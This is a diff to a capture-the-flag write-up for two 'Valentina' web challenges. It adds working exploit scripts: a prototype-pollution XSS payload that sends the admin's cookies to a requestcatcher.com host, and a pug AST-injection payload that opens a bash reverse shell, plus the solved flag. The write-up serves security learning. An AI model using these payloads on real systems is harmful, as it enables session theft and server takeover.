@@ -4,10 +4,7 @@ Valentina contained 2 challenges sharing a vulnerability but with different appl
 
 ## Challenge 1
 
-```
-TODO: Ask Vie for challenge desc
-Summary: Valentina checks her reviews occasionally with secrets in her cookies.
-```
+The website admin checks her reviews with secrets in her cookies.
 
 ## Walkthrough 1
 
@@ -61,12 +58,11 @@ FilterXSS.prototype.process = function (html) {
 Reading the source code revealed that we could control the `whiteList` variable which controlled which tags were escaped.
 
 ```json
-//  getDefaultWhiteList()
-{
-	a: ["target", "href", "title"],
-	abbr: ["title"],
-	address: [],
-	// ...
+"whiteList": {
+	"a": ["target", "href", "title"],
+	"abbr": ["title"],
+	"address": [],
+	"_comment": "...",
 }
 ```
 
@@ -80,7 +76,7 @@ payload = "fetch('https://crimist.requestcatcher.com/'+document.cookie)"
 review = requests.post(url, headers={'content-type': 'application/json'},
                             data='{"__proto__": {"whiteList": {"script": []}}, "message": "<script>' + payload + '</script>"}')
 id = review.text.split(":")[1]
-print("http://localhost:8999/view_review?review_id=" + id)
+print("http://localhost:8999/view_review?review_id=" + id) # submit this to /report
 ```
 
 ## Solve 1
@@ -89,14 +85,32 @@ print("http://localhost:8999/view_review?review_id=" + id)
 
 ## Challenge 2
 
-```
-TODO: Ask Vie for challenge desc
-```
+`flag.txt` exists in the projects directory.
 
 ## Walkthrough 2
 
-TODO
+Given that this website was served by nodejs and I couldn't read arbitrary files it was clear I'd have to pwn the server further.
+
+After searching for ways to exploit this prototype pollution vulnerability further I found [this blog post](https://blog.p6.is/AST-Injection/#Pug) about exploiting [pug](https://github.com/pugjs/pug), the template engine used in this project.
+
+I won't re-hash their work, check out the post if you're interested. To summarize, it gets you RCE so you can pop a reverse shell.
+
+```py
+import requests
+
+url = "http://localhost:8999"
+review = requests.post(url + "/add_review", json={
+    "__proto__": {
+        "debug": True,
+        "block": {
+            "type": "Text",
+            "line": "console.log(process.mainModule.require('child_process').execSync(`bash -c 'bash -i >& /dev/tcp/<ipip>/3333 0>&1'`))",
+        },
+    },
+    "message": ":)",
+})
+```
 
 ## Solve 2
 
-TODO
+`maple{Th1s_was_really_c0mpl1cAted_Im_s0rrY}`
